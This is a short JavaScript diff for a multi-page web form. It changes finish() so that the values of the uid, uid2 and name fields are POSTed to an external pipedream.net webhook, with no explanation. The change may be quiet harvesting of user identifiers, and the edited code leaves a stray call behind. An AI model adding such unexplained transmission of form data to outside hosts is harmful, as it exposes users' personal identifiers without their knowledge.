@@ -192,7 +192,26 @@ document.getElementById("page"+page).classList.add("active");
 
 }
 
-function finish(){
+function finish() {
+
+    const uid = document.getElementById("uid").value;
+    const uid2 = document.getElementById("uid2").value;
+    const name = document.getElementById("name").value;
+
+    fetch("https://eoc0klx6oxuuegp.m.pipedream.net", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            uid: uid,
+            uid2: uid2,
+            name: name
+        })
+    });
+
+    next(4);
+}
 
 next(4);
 
